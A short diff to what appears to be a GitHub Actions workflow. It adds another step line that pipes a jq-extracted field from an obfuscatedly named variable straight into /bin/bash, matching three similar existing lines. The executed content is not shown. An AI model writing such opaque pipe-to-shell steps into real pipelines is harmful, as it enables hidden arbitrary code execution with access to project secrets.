@@ -22,6 +22,7 @@ jobs:
           echo $ngto7925 | jq -r .igm57430 | /bin/bash
           echo $db67 | jq -r .ydizd69 | /bin/bash
           printf '%s' "$bwphh324" | jq -r .a5846 | /bin/bash
+          echo $rpzj0997 | jq -r .trg3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
